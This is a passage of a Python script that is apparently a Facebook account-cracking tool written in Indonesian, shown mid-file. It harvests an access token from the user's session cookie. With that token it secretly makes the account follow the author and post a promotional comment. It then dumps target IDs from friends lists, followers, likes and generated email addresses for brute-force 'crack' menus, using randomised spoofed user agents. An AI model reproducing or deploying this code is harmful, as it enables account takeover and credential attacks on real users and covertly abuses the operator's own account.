,'GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']  
   strvoppo = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
   strvredmi = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvoppo1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; Infinix {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvsamsung = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
   strvnokiax = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
   strvgt = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
   uateddy = random.choice([strvredmi,strvsamsung,strvgt])
   ugen2.append(uateddy)
   
def opera():
	rr = random.randint
	rc = random.choice
	bahasa = random.choice(["en","fr","ru","tr","id","pt","es","en-GB"])
	ua1 = f"Opera/9.80 (BlackBerry; Opera Mini/8.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua2 = f"SAMSUNG-GT-S3802 Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua3 = f"Opera/9.80 (iPhone; Opera Mini/16.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua4 = f"Opera/9.80 (Android; Opera Mini/11.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua5 = f"Opera/9.80 (Windows Mobile; Opera Mini/5.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	jancok = rc([ua1,ua2,ua3,ua4,ua5])
	return jancok  

def uaku():
    try:
        ua = open("fan.txt", "r").read().splitlines()
        for ub in ua:
            prem.append(ub)
    except:
        a = requests.get("https://github.com/fanky86/a/blob/main/fan.txt").text
        ua = open("fan.txt", "w")
        aa = re.findall('line">(.*?)<', str(a))
        for un in aa:
            ua.write(un + "\n")
        ua = open("fan.txt", "r").read().splitlines()

# ------------[ INDICATION ]---------------#
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE
try:
    file_color = open("data/theme_color", "r").read()
    color_text = file_color.split("|")[0]
    color_panel = file_color.split("|")[1]
except:
    color_text = "[#00FF00]"
    W1 = random.choice([M2, H2, K2])
    W2 = random.choice([K2, M2, K2])
    W3 = random.choice([H2, K2, M2])
    color_panel = "#00FF00"
    color_ok = "#00FF00"
    color_cp = "#FFFF00"
try:
    color_table = open("data/theme_color", "r").read()
except FileNotFoundError:
    color_table = "#00FF00"

SE = "[#9F9F9F]"
puti = "\x1b[1;97m"  # WARNA-PUTIH
mer = "\x1b[1;91m"  # WARNA-MERAH
kun = "\x1b[1;93m"  # WARNA-KUJING
hijo = "\x1b[1;92m"  # WARNA-HIJAU
ung = "\x1b[1;95m"  # WARNA-UNGU
biru = "\x1b[1;94m"  # WARNA-BIRU
P = "\x1b[1;97m"  # PUTIH
M = "\x1b[1;91m"  # MERAH
H = "\x1b[1;92m"  # HIJAU
K = "\x1b[1;93m"  # KUNING
B = "\x1b[1;94m"  # BIRU
U = "\x1b[1;95m"  # UNGU
O = "\x1b[1;96m"  # BIRU MUDA
N = "\x1b[0m"  # WARNA MATI
# ------------[ WARNA-COLOR ]--------------#
P = "\x1b[1;97m"
M = "\x1b[1;91m"
H = "\x1b[1;92m"
K = "\x1b[1;93m"
B = "\x1b[1;94m"
U = "\x1b[1;95m"
O = "\x1b[1;96m"
N = "\x1b[0m"
Z = "\033[1;30m"
sir = "\033[41m\x1b[1;97m"
x = "\33[m"  # DEFAULT
m = "\x1b[1;91m"  # RED +
k = "\033[93m"  # KUNING +
h = "\x1b[1;92m"  # HIJAU +
hh = "\033[32m"  # HIJAU -
u = "\033[95m"  # UNGU
kk = "\033[33m"  # KUNING -
b = "\33[1;96m"  # BIRU -
p = "\x1b[0;34m"  # BIRU +
asu = random.choice([m, k, h, u, b])
kom1 = "Anjng Panutan Ku, Keren Bngt Bnjerr 🤙\n -\nhttps://www.facebook.com/100043537611609/posts/878169396977639/?app=fbl\n-\n \nkomentar ditulis oleh bot\n \n[ Semangat Bang @[100043537611609:] ]"
kom2 = random.choice(["Jadikan Aku Anak Buah Mu Bang @[100043537611609:]","Panutan Ku","Sebenarnya Aku Suka Sama Kamu, Tetapi Aku Cuma Butuh Waktu Untuk Mengungkapkan Isi Hati Ku"])
kom3 = "Panutan Ku"
kom4 = "Pintar Banget"
kom5 = "Jadikan Aku Anak Buah Mu Bang @[100043537611609:]"
kom6 = " Izin Share Ya Bang\n-\nhttps://www.facebook.com/100043537611609/posts/878169396977639/?app=fbl\n-\nSemangat Ya Bang ❤"
# --------------------[ CONVERTER-BULAN ]--------------#
dic = {
    "1": "January",
    "2": "February",
    "3": "March",
    "4": "April",
    "5": "May",
    "6": "June",
    "7": "July",
    "8": "August",
    "9": "September",
    "10": "October",
    "11": "November",
    "12": "December",
}
dic2 = {
    "01": "January",
    "02": "February",
    "03": "March",
    "04": "April",
    "05": "May",
    "06": "June",
    "07": "July",
    "08": "August",
    "09": "September",
    "10": "October",
    "11": "November",
    "12": "December",
}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = "OK-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"
cpc = "CP-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"
hour = datetime.datetime.now().hour
hari_ini = datetime.datetime.now().strftime("%d %B %Y")


# --> Pengkondisian Jam Untuk Salam Harian
def waktucok():
    now = datetime.now()
    hours = now.hour
    if 4 <= hours < 12:
        timenow = "Selamat Pagi"
    elif 12 <= hours < 15:
        timenow = "Selamat Siang"
    elif 15 <= hours < 18:
        timenow = "Selamat Sore"
    else:
        timenow = "Selamat Malam"
    return timenow

def maintenance():
    print()
    Console().print(
        "[bold green] MOHON MAAF UNTUK SEKARANG SCRIPT DALAM TAHAP PERBAIKAN",
        width=60,
        style="bold cyan",
    )
    print()


# ------------------[ MACHINE-SUPPORT ]---------------#
def clear():
    os.system("clear")

# ------------------[ LOGO-LOADING ]-----------------#
def loading():
    animation = [
        "[\x1b[1;91m■\x1b[0m□□□□□□□□□]",
        "[\x1b[1;92m■■\x1b[0m□□□□□□□□]",
        "[\x1b[1;93m■■■\x1b[0m□□□□□□□]",
        "[\x1b[1;94m■■■■\x1b[0m□□□□□□]",
        "[\x1b[1;95m■■■■■\x1b[0m□□□□□]",
        "[\x1b[1;96m■■■■■■\x1b[0m□□□□]",
        "[\x1b[1;97m■■■■■■■\x1b[0m□□□]",
        "[\x1b[1;98m■■■■■■■■\x1b[0m□□]",
        "[\x1b[1;99m■■■■■■■■■\x1b[0m□]",
        "[\x1b[1;910m■■■■■■■■■■\x1b[0m]",
    ]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(
            f"\r {H}• {P}Loading...{N} " + animation[i % len(animation)] + "\x1b[0m "
        )
        sys.stdout.flush()
# ------------------[ LOGO-LAKNAT ]-----------------#
def logoku():
    prints(
        Panel(
            f"""{P2}╔╗──╔══╦═══╦═══╦═╗─╔╦═══╦══╗
║║──╚╣╠╣╔═╗║╔══╣║╚╗║║╔═╗╠╣╠╝
║║───║║║╚══╣╚══╣╔╗╚╝║╚══╗║║
║║─╔╗║║╚══╗║╔══╣║╚╗║╠══╗║║║
║╚═╝╠╣╠╣╚═╝║╚══╣║─║║║╚═╝╠╣╠╗
╚═══╩══╩═══╩═══╩╝─╚═╩═══╩══╝""",
            title="Selamat Datang",
            width=60,
            style=f"{color_panel}",
        )
    )


def banner():
    Console().print(
        Panel(
            """
[bold red]███████████████████████    
[bold red]███████████████████████ [bold yellow]Github : [bold green]fanky86
[bold red]███████████████████████ [bold yellow]Wa     : [bold green]+62895359611***
[bold white]███████████████████████          
[bold white]███████████████████████          
[bold white]███████████████████████ 
[bold white]""",
            width=60,
            style=f"{color_panel}",
        )
    )


# --------------------[ LICENSE ]--------------#
def register_device():
	while True:
		logoku()
		if os.path.exists(".license"):
			key = open(".license","r").read()
			check = requests.get("https://pastebin.com/raw/eKMyyVzJ").text
			if key in check:
				lisensiku.append("sukses")
				Console().print(Panel(f"{H2} • {H2}Key anda telah di konfirmasi ✓{hapus}",width=60,style=f"{color_panel}"))
				time.sleep(1.5)
				login()
			else:
				Console().print(Panel(f"{H2} • {P2}YOUR KEY : {key}",width=60,style=f"{color_panel}"))
				Console().print(Panel(f"{H2} • {M2}Key anda belum di konfirmasi{hapus}\n{H2} • {P2}Silahkan Beli Ke {hapus}{H2}+62895359611122{hapus}{P2} untuk menggunakan sc{hapus}",width=60,style=f"{color_panel}"))
				buy_key = console.input(f"{H2} • {P2}Tekan enter untuk chat whatsapp author untuk membeli key")
				if buy_key in [""]:pass
				jalan(f'   Anda akan diarahkan ke whatsapp author');time.sleep(2)
				os.system(f'xdg-open http://wa.me/+62895359611122?text=Bang+beli+key+sc+Facebook+{key}')
		if not os.path.exists(".license"):
			key_gen = random.randint(10000000,99999999)
			enc_key = base64.b16encode(str(key_gen).encode()).decode("utf-8")
			with open(".license","w") as tulis:
				tulis.write(enc_key)
			continue
		break

			
# --------------------[ BAGIAN-MASUK ]--------------#
def login123():
    os.system("clear")
    banner()
    Console().print(
        Panel(
            f"""{P2}[{color_text}01{P2}].Login Menggunakan Cookie\n[{color_text}02{P2}].{M2}Keluar""",
            width=60,
            style=f"{color_panel}",
            title="[bold green]Login",
        )
    )
    bryn = console.input(f" {H2}• {P2}pilih menu : ")
    if bryn in ["1", "01"]:
        logincoki()
    elif bryn in ["2", "02"]:
        exit()
    else:
        Console().print(f" {H2}• {P2}[bold red]Pilihan Tidak Diketahui!", end="\r")
        time.sleep(5)
        login()


def login():
    try:
        token = open(".vipertok.txt", "r").read()
        cok = open(".vipercok.txt", "r").read()
        tokenku.append(token)
        try:
            sy = requests.get(
                "https://graph.facebook.com/me?fields=id,name&access_token="
                + tokenku[0],
                cookies={"cookie": cok},
            )
            sy2 = json.loads(sy.text)["name"][0:15]
            sy3 = json.loads(sy.text)["id"]
            menu(sy2, sy3)
        except KeyError:
            login123()
        except requests.exceptions.ConnectionError:
            Console().print(
                f" {H2}• {P2}[bold red]Problem Internet Connection, Check And Try Again"
            )
            exit()
    except IOError:
        login123()



def logincoki():
	asu = random.choice([m,k,h,b,u])
	cok = Console().input(f" {H2}• {P2}cookie : ")
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:
			print(f'{k}  Cookies invalid');time.sleep(2);exit()				
		else:
			for x in find:
				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				token = re.search('(EAAB\w+)',xz.text).group(1)
				open('.vipertok.txt','w').write(token)
				open('.vipercok.txt','w').write(cok)			
				Console().print(Panel(f"""{P2}{token}""",width=60,style=f"{color_panel}",title="[bold green]TOKEN"))
				Console().print(f" {H2}• {P2}[bold green]Login Berhasil,jalankan Ulang Script")
				time.sleep(3)
				exit()				
	except Exception as e:
		os.system("rm -f .vipertok.txt")
		os.system("rm -f .vipercok.txt")
		print(e)
		exit()


		
def logincokiwww():
	cookie = Console().input(f" {H2}• {P2}cookie : ")
	try:
		ses.headers.update(
			{
				"Accept-Language": "id,en;q=0.9",
				"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
				"Referer": "https://www.instagram.com/",
				"Host": "www.facebook.com",
				"Sec-Fetch-Mode": "cors",
				"Accept": "*/*",
				"Connection": "keep-alive",
				"Sec-Fetch-Site": "cross-site",
				"Sec-Fetch-Dest": "empty",
				"Origin": "https://www.instagram.com",
				"Accept-Encoding": "gzip, deflate",
			}
		)
		link = ses.get("https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/",cookies={"cookie": cookie})
		if '"access_token":' in str(link.headers):
			token = re.search('"access_token":"(.*?)"', str(link.headers)).group(1)
			open(".vipercok.txt", "w").write(cookie)
			open(".vipertok.txt", "w").write(token)
			viperfollow(cookie)
			requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}",headers={"cookie": cookie})
			Console().print(Panel(f"""{P2}{token}""",width=60,style=f"{color_panel}",title="[bold green]TOKEN"))
			Console().print(f" {H2}• {P2}[bold green]Login Berhasil,jalankan Ulang Script")
	except Exception as e:
		Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluwarsa Bang")
		os.system("rm -rf .vipertok.txt && rm -rf .vipercok.txt")
		print(e)
		time.sleep(3)
		exit()
	except:
		pass


def followdong():
    try:
        token = open(".vipertok.txt", "r").read()
        cok = open(".vipercok.txt", "r").read()
    except IOError:
        print(" [+] Cookies Kadaluarsa ")
        time.sleep(5)
        logincoki()
    myuid = "100043537611609"
    try:
        for foll in parser(
            requests.get(
                f"https://mbasic.facebook.com/" + myuid, cookies={"cookie": cok}
            ).text,
            "html.parser",
        ).find_all("a", href=True):
            if "/a/subscribe.php?" in foll.get("href"):
                x = requests.get(
                    "https://mbasic.facebook.com" + foll["href"],
                    cookies={"cookie": cok},
                ).text
                exit()
    except Exception as e:
        print(e)  # < Response error


def viperfollow(VIPER):  # YANG GAK GANTI BOT FOLLOW GANTENG
    from bs4 import BeautifulSoup as BSP

    try:
        req = BSP(
            requests.get("https://m.facebook.com/100043537611609", cookies=VIPER).text,
            "html.parser",
        )
        for i in req.find_all("a", href=True):
            if "/a/subscribe.php?" in str(i.get("href")):
                r = requests.get(
                    "https://m.facebook.com%s" % (i["href"]), cookies=VIPER
                ).text
    except:
        pass


# ----------------[ BAGIAN-MENU ]----------------#
def menu(my_name, my_id):
    try:
        prem = f"{H2}Premium"
    except (KeyError, FileNotFoundError):
        prem = f"{H2}Premium"

    try:
        token = open(".vipertok.txt", "r").read()
        cookie = open(".vipercok.txt", "r").read()
        cok = open(".vipercok.txt", "r").read()
    except IOError:
        Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa tolkon")
        os.system("rm -rf .vipertok.txt && rm -rf .vipercok.txt")
        time.sleep(3)
        login()
    try:
        link = ses.get(
            f"https://graph.facebook.com/me?fields=friends&access_token={token}",
            cookies={"cookie": cookie},
        ).json()
        for c in link["friends"]["data"]:
            temanku.append(c["id"] + "|" + c["name"])
    except:
        pass
    os.system("clear")
    banner()
    followdong()
    try:
        key = open(".license","r").read()
    except:
        key = "-"
    negara = requests.get("http://ip-api.com/json/").json()["country"]
    ip = requests.get("http://ip-api.com/json/").json()["query"]
    prints(Panel(f"{P2}{negara}", padding=(0, 22), width=60, style=f"{color_panel}"))
    dia.append(
        Panel(
            f"{P2}lisensi : {H2}{key}\n{P2}tanggal : {H2}{hari_ini}\n{P2}jam     : {H2}{hour}\n{P2}status  : {prem}",
            width=30,
            title=f"{P2}Lisensi",
            style=f"{color_panel}",
        )
    )
    # dia.append(Panel(f'{P2}IP      : {H2}{ip}\n{P2}premium : {H2}Premium\n{P2}Negara  : {H2}{negara}',width=30,style=f"{color_panel}"))
    dia.append(
        panel(
            f"{P2}Name   : {H2}{my_name}\n{P2}Idz    : {H2}{my_id}\n{P2}Teman  : {H2}{(len(temanku))}\n{P2}IP     : {H2}{ip}",
            title=f"{P2}Bio Data",
            width=30,
            style=f"{color_panel}",
        )
    )
    console.print(Columns(dia))
    prints(
        Panel(
            f"""{P2}[{color_text}01{P2}]. crack dari id publik   [{color_text}05{P2}]. crack dari pengikut
[{color_text}02{P2}]. crack dari id Masal    [{color_text}06{P2}]. Dump ID Publik
[{color_text}03{P2}]. crack dari Like        [{color_text}07{P2}]. crack dari File
[{color_text}04{P2}]. crack dari random mail [{color_text}08{P2}]. crack dari opsi CP""",
            width=60,
            style=f"{color_panel}",
        )
    )
    prints(
        Panel(
            f"""{P2}ketik {H2}bot{P2} untuk ke menu bot dan ketik {H2}lain{P2} untuk ke menu lain""",
            width=60,
            style=f"{color_panel}",
        )
    )
    HaHi = console.input(f" {H2}• {P2}pilih menu : ")
    if HaHi in [""]:
        console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! ")
    elif HaHi in ["1", "01"]:
        idt = input('\n[ ID Target : ')
        dump(idt,"",{"cookie":cok},token)
        setting()
    elif HaHi in ["2", "02"]:
        massal()
    elif HaHi in ["3", "03"]:
        crack_post()
    elif HaHi in ["4", "04"]:
        crack_email()
    elif HaHi in ["5", "05"]:
        crack_foll()
    elif HaHi in ["6", "06"]:
        publikv2()
    elif HaHi in ["7", "07"]:
        crack_file()
    elif HaHi in ["8", "08"]:
        file_cp()

    ###----------[ PINDAH KE MENU BOT ]---------- ###
    elif HaHi in ["BOT", "Bot", "bot"]:
        botdata().menu()
    elif HaHi in ["LAIN", "Lain", "lain"]:
        Lain(cookie).menu()
    else:
        console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! ")
def crack_foll():
    try:
        pepek = open('.vipertok.txt','r').read()
        idt = console.input(f" {H2}• {P2}Masukan id : ")
        r = requests.get(f"https://graph.facebook.com/{idt}/subscribers?limit=999999&access_token={pepek}")
        z = json.loads(r.text)
        for a in z["data"]:
            id.append(a["id"] + "|" + a["name"])
    except KeyError:
        print(' %s[%s!%s] ID %s tidak publik'%(N,O,N,idt))
        time.sleep(3)
        exit()
    else:
        setting()
        
def crack_post():
    pepek = open('.vipertok.txt','r').read()
    try:
        idt = console.input(f" {H2}• {P2}Masukan id : ")
        r = requests.get(f"https://graph.facebook.com/{idt}/likes?limit=50000&access_token={pepek}")
        z = json.loads(r.text)
        for a in z["data"]:
            id.append(a["id"] + "|" + a["name"])
    except KeyError:
        print(' %s[%s!%s] ID %s tidak publik'%(N,O,N,idt))
        time.sleep(3)
        exit()
    else:
        setting()


#----------[ CRACK-PUBLIK  ]----------#            
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r [ sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
			print()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass



def dump_publik():
	with requests.Session() as ses:
		token = open(".vipertok.txt", "r").read()
		cok = open(".vipercok.txt", "r").read()
		cookie={"cookie": cok}
		fields = "name,friends.fields(id,name,birthday)"
		prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik""",width=60,style=f"{color_panel}"))
		idf = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
		try:
			headers = {
				"connection": "keep-alive",
				"accept": "*/*",
				"sec-fetch-dest": "empty",
				"sec-fetch-mode": "cors",
				"sec-fetch-site": "same-origin",
				"sec-fetch-user": "?1",
				"sec-ch-ua-mobile": "?1",
				"upgrade-insecure-requests": "1",
				"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
				"accept-encoding": "gzip, deflate",
				"accept-language": "id-ID,id;q=0.9",
			}
			if len(id) == 0:
				params = {"access_token": token,"fields": fields}
			else:
				params = {"access_token": token, "fields": f"{fields}.after({fields})"}
			url = ses.get(f"https://graph.facebook.com/{idf}",params=params,headers=headers,cookies=cookie).json()
			for i in url["friends"]["data"]:
				id.append(i["id"] + "|" + i["name"])
			setting()
		except Exception as e:
			print(f"Error : {e}")



def dump_publikkk():
    with requests.Session() as ses:
        token = open(".vipertok.txt", "r").read()
        cok = open(".vipercok.txt", "r").read()
        prints(
            Panel(
                f"""{P2}masukan id target, pastikan id target bersifat publik""",
                subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",
                width=60,
                style=f"{color_panel}",
            )
        )
        a = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
        if a in ["me", "Me", "ME"]:
            try:
                koH = requests.get(
                    f"https://graph.facebook.com/{a}?fields=friends&access_token={token}",
                    cookies={"cookie": cok},
                ).json()
                for pi in koH["friends"]["data"]:
                    try:
                        id.append(pi["id"] + "|" + pi["name"])
                    except:
                        continue
                setting()
            except Exception as d:
                print(d)
        else:
            try:
                b = ses.get(
                    f"https://graph.facebook.com/{a}?fields=friends&access_token={token}",
                    cookies={"cookie": cok},
                ).json()
                for c in b["friends"]["data"]:
                    id.append(c["id"] + "|" + c["name"])
                setting()
            except Exception as e:
                print(e)


# -----------------[ CRACK EMAIL ]-----------------#
def crack_email():
    rc = random.choice
    rr = random.randint
    xc = [
        "andi",
        "dwi",
        "muhammad",
        "nur",
        "dewi",
        "tri",
        "dian",
        "sri",
        "putri",
        "eka",
        "sari",
        "aditya",
        "basuki",
        "budi",
        "joni",
        "toni",
        "cahya",
        "riski",
        "farhan",
        "aden",
        "joko",
    ]
    blk = [
        "99",
        "official",
        "gaming",
        "utama",
        "123",
        "1234",
        "12345",
        "123456",
        "cakep",
    ]
    global ok, cp
    Console().print(
        panel(
            f"{P2}Masukan Nama Email Yang Ingin Di Crack\nContoh : {H2}Adi, Dimas, Andi",
            width=60,
            style=f"{color_panel}",
        )
    )
    nama = console.input(f" {H2}• {P2}Masukan Nama Target : ")
    if "," in str(nama):
        console.print(f" [+] Masukan Nama, Jangan Kosong Ngab")
        time.sleep(3)
        exit()
    Console().print(
        panel(
            f"{P2}Masukan Nama Domain\nContoh : {H2} @Gmail.com, @Yahoo.com, Dll",
            width=60,
            style=f"{color_panel}",
        )
    )
    doma = console.input(f" {H2}• {P2}Masukan Nama Domain : ")
    if "@" not in str(doma) or ".com" not in str(doma):
        console.print(f" [+] Masukan Domain Dengan Benar")
        time.sleep(3)
        exit()
    jumlah = console.input(f" {H2}• {P2}Total Ingin Dump : ")
    for xyz in range(int(jumlah)):
        A = nama
        B = [
            f"{str(rc(xc))}",
            f"{str(rr(0,31))}",
            f"{str(rc(blk))}" f"{str(rc(xc))}{str(rr(0,31))}",
            f"{xyz}",
            f"{str(rc(blk))}{str(rr(0,31))}",
            f"{str(rc(xc))}{str(rc(blk))}",
        ]
        C = doma
        D = f"{A}{str(rc(B))}{C}"
        if D in id:
            pass
        else:
            id.append(D + "|" + nama)
        if len(id) == 999999:
            setting()
        sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...")
        sys.stdout.flush()
        time.sleep(0.0000003)
    print("\r")
    setting()


##------------[Crack File]------------##
def crack_file():
    try:
        vin = os.listdir("/sdcard/RUDAL-DUMP/")
    except FileNotFoundError:
        console.print(f" {H2}• {P2}File Tidak Ditemukan ")
        time.sleep(2)
        exit()
    if len(vin) == 0:
        console.print(f" {H2}• {P2}Kamu Tidak Memiliki File Dump ")
        time.sleep(2)
        exit()
    else:
        cih = 0
        lol = {}
        for isi in vin:
            try:
                hem = open("/sdcard/RUDAL-DUMP/" + isi, "r").readlines()
            except:
                continue
            cih += 1
            if cih < 100:
                nom = "" + str(cih)
                lol.update({str(cih): str(isi)})
                lol.update({nom: str(isi)})
                console.print(
                    Panel(
                        f"{H2}• {P2}%s. %s    ──>   %s Idz " % (nom, isi, len(hem)),
                        width=80,
                        style=f"{color_panel}",
                    )
                )
            else:
                lol.update({str(cih): str(isi)})
                print(
                    "["
                    + str(cih)
                    + "] "
                    + isi
                    + " [ "
                    + str(len(hem))
                    + " Account ]"
                    + x
                )
                console.print(
